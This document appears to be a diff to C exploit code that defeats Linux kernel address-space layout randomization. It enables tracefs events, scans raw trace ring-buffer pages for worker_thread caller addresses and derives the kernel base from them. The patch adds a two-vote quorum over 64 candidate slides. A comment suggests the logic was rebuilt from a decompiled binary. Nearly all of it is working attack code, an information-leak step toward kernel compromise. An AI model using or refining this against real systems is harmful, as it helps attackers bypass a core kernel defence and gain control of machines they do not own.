@@ -120,8 +120,33 @@ static int validate_caller(uint64_t caller, uint64_t *candidate_out) {
   return 1;
 }
 
+#define KASLR_CANDIDATE_COUNT 64U
+#define KASLR_QUORUM 2U
+
+static int add_candidate_vote(uint64_t caller,
+                              unsigned int votes[KASLR_CANDIDATE_COUNT],
+                              uint64_t *candidate_out) {
+  uint64_t candidate = 0;
+  if (!validate_caller(caller, &candidate)) {
+    return 0;
+  }
+  size_t slot = (size_t)(candidate >> 15);
+  if (slot >= KASLR_CANDIDATE_COUNT) {
+    return 0;
+  }
+  if (votes[slot] < UINT32_MAX) {
+    votes[slot]++;
+  }
+  if (votes[slot] < KASLR_QUORUM) {
+    return 0;
+  }
+  *candidate_out = candidate;
+  return 1;
+}
+
 static int parse_trace_page(const unsigned char *page, size_t page_len,
-                             uint64_t *candidate_out) {
+                            unsigned int votes[KASLR_CANDIDATE_COUNT],
+                            uint64_t *candidate_out) {
   if (page_len < 20) {
     return 0;
   }
@@ -129,6 +154,7 @@ static int parse_trace_page(const unsigned char *page, size_t page_len,
   /* FUN_0010597c first scans every 4-byte-aligned position in the raw page.
    * This recovers events whose ring-buffer header shape the structured walk
    * below cannot decode. Keep the event id and slide checks strict. */
+  unsigned int loose_matches = 0;
   for (size_t pos = 0; pos + 0x18 <= page_len; pos += 4) {
     uint16_t event_id = 0;
     memcpy(&event_id, page + pos, sizeof(event_id));
@@ -137,9 +163,20 @@ static int parse_trace_page(const unsigned char *page, size_t page_len,
     }
     uint64_t caller = 0;
     memcpy(&caller, page + pos + 0x10, sizeof(caller));
-    if (validate_caller(caller, candidate_out)) {
+    uint64_t candidate = 0;
+    if (validate_caller(caller, &candidate)) {
+      loose_matches++;
+    }
+    if (add_candidate_vote(caller, votes, candidate_out)) {
       return 1;
     }
+  }
+
+  /* Every structured record is also normally seen by the aligned scan.
+   * Avoid counting the same record twice. Structured parsing remains the
+   * fallback for page shapes not recovered by that scan. */
+  if (loose_matches != 0) {
+    return 0;
   }
 
   uint64_t commit = 0;
@@ -177,7 +214,7 @@ static int parse_trace_page(const unsigned char *page, size_t page_len,
       memcpy(&caller, page + record + 16, sizeof(caller));
       /* source: real /proc/kallsyms _text readings this session across
        * different boots show 32-KiB KASLR granularity. */
-      if (validate_caller(caller, candidate_out)) {
+      if (add_candidate_vote(caller, votes, candidate_out)) {
         return 1;
       }
     }
@@ -214,6 +251,7 @@ static uint64_t monotonic_ms(void) {
 }
 
 static int drain_trace_reader(struct trace_reader *reader,
+                              unsigned int votes[KASLR_CANDIDATE_COUNT],
                               uint64_t *candidate_out) {
   unsigned char page[4096];
   for (;;) {
@@ -221,7 +259,7 @@ static int drain_trace_reader(struct trace_reader *reader,
     if (got > 0) {
       reader->pages++;
       reader->bytes += got;
-      if (parse_trace_page(page, (size_t)got, candidate_out)) return 1;
+      if (parse_trace_page(page, (size_t)got, votes, candidate_out)) return 1;
       continue;
     }
     if (got < 0 && errno == EINTR) continue;
@@ -247,9 +285,12 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
 
   if (!tracefs_write(event_enable, "1") || !tracefs_write(tracing_on, "1")) {
     fprintf(stderr, "[kaslr] enable tracing failed errno=%d\n", errno);
+    tracefs_write(tracing_on, "0");
+    tracefs_write(event_enable, "0");
     return 0;
   }
 
+  prime_block_io();
   prime_block_io();
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
@@ -286,6 +327,7 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
   fprintf(stderr, "[kaslr] sampling sched_blocked_reason up to %dms\n",
           wait_ms);
   uint64_t candidate = 0;
+  unsigned int votes[KASLR_CANDIDATE_COUNT] = {0};
   int found = 0;
   uint64_t started_ms = monotonic_ms();
   uint64_t deadline_ms = started_ms + (uint64_t)wait_ms;
@@ -295,7 +337,7 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
     while (!found) {
       for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
         if (readers[cpu].fd >= 0) {
-          found = drain_trace_reader(&readers[cpu], &candidate);
+          found = drain_trace_reader(&readers[cpu], votes, &candidate);
         }
       }
       uint64_t now_ms = monotonic_ms();
@@ -313,7 +355,7 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
   if (!found) {
     for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
       if (readers[cpu].fd >= 0) {
-        found = drain_trace_reader(&readers[cpu], &candidate);
+        found = drain_trace_reader(&readers[cpu], votes, &candidate);
       }
     }
   }
@@ -332,15 +374,25 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
   tracefs_write(event_enable, "0");
 
   if (!found) {
-    fprintf(stderr, "[kaslr] worker_thread caller not found in trace\n");
+    unsigned int best = 0;
+    for (size_t i = 0; i < KASLR_CANDIDATE_COUNT; i++) {
+      if (votes[i] > best) {
+        best = votes[i];
+      }
+    }
+    fprintf(stderr,
+            "[kaslr] worker_thread quorum not reached best=%u required=%u\n",
+            best, KASLR_QUORUM);
     return 0;
   }
 
   *kernel_base_out = KIMAGE_TEXT_BASE + candidate;
   fprintf(stderr,
           "[kaslr] source=tracefs base=%016llx slide=%016llx "
-          "p0_offset=%08llx sample_ms=%llu\n",
+          "p0_offset=%08llx votes=%u sample_ms=%llu\n",
           (unsigned long long)*kernel_base_out, (unsigned long long)candidate,
-          (unsigned long long)candidate, (unsigned long long)elapsed_ms);
+          (unsigned long long)candidate,
+          votes[(size_t)(candidate >> 15)],
+          (unsigned long long)elapsed_ms);
   return 1;
 }
